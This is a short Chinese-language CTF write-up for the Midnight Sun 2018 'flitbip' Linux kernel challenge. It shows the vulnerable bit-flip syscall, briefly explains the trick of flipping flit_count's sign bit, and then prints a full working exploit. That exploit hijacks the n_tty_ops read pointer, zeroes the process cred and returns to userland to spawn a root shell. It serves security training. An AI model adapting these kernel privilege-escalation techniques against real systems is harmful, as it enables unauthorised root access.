# MidnightSun2018-filpbit


# filpbit

源码提供：

```c
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/syscalls.h>

#define MAXFLIT 1

#ifndef __NR_FLITBIP
#define FLITBIP 333
#endif

long flit_count = 0;
EXPORT_SYMBOL(flit_count);

SYSCALL_DEFINE2(flitbip, long *, addr, long, bit)
{
        if (flit_count >= MAXFLIT)
        {
                printk(KERN_INFO "flitbip: sorry :/\n");
                return -EPERM;
        }

        *addr ^= (1ULL << (bit));
        flit_count++;

        return 0;
}

```

几乎没有开启任何的保护，通过自定义的系统调用修改指定的内存的数据。

题目逻辑是希望只能实现一次，而`flit_count`数据类型是long，如果将其最高位翻转，则可以达到修改任意次。

通过修改`n_tty_ops`的函数指针控制rip，控制执行流后需要修改当前进程的cred。通过读取`current_task`得到PCB，进而得到cred。

# The full exp

```c
#define _GNU_SOURCE
#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <malloc.h>
#include <netinet/in.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/xattr.h>
#include <unistd.h>

uint64_t *flit_count = (uint64_t *)0xffffffff818f4f78;
uint64_t *n_tty_read = (uint64_t *)0xffffffff810c8510;
uint64_t *n_tty_ops = (uint64_t *)0xffffffff8183e320;
uint64_t *n_tty_ops_read = (uint64_t *)(0xffffffff8183e320 + 0x30);
uint64_t *current_task = (uint64_t *)0xffffffff8182e040;

void die(const char *msg) {
  fprintf(stderr, msg, strlen(msg), 0);
  exit(-1);
}

uint64_t user_cs, user_ss, user_rflags, user_sp;

void save_status() {
  __asm__("mov %0, cs;"
          "mov %1, ss;"
          "mov %2, rsp;"
          "pushfq;"
          "popq %3;"
          : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
          :
          : "memory");
  puts("[*] status has been saved.");
}

void pop_shell() {
  if (!getuid()) {
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve("/bin/sh", argv, envp);
    puts("[*] Root!");
  } else {
    die("[!] spawn shell error!\n");
  }
}

int __flit(void *addr, uint64_t bit) {
  __asm__("mov rax, 333;"
          "syscall;");
}

int flitbip(void *addr, uint64_t bit) {
  int ret = __flit(addr, bit);
  if (ret < 0) {
    die("[!] flit failed\n");
  }
  return ret;
}

void root() {
  uint64_t *cred = (uint64_t *)*(uint64_t *)((char *)*current_task + 0x3c0);
  memset(cred, 0, 28);

  *(uint64_t *)n_tty_ops_read = (uint64_t)n_tty_read;

  __asm__("swapgs;"
          "mov rax, %0;"
          "push rax;"
          "mov rax, %1;"
          "push rax;"
          "mov rax, %2;"
          "push rax;"
          "mov rax, %3;"
          "push rax;"
          "mov rax, %4;"
          "push rax;"
          "iretq;"
          :
          : "r"(user_ss), "r"(user_sp), "r"(user_rflags), "r"(user_cs),
            "r"(pop_shell)
          : "memory");
}

int main() {
  save_status();

  flitbip(flit_count, 63);

  uint64_t flipper = (uint64_t)root ^ (uint64_t)n_tty_read;
  for (int i = 0; i < 64; i++) {
    if ((flipper & 1) == 1)
      flitbip(n_tty_ops_read, i);
    flipper >>= 1;
  }
  char buf;
  scanf("%c", &buf);

  return 0;
}
```


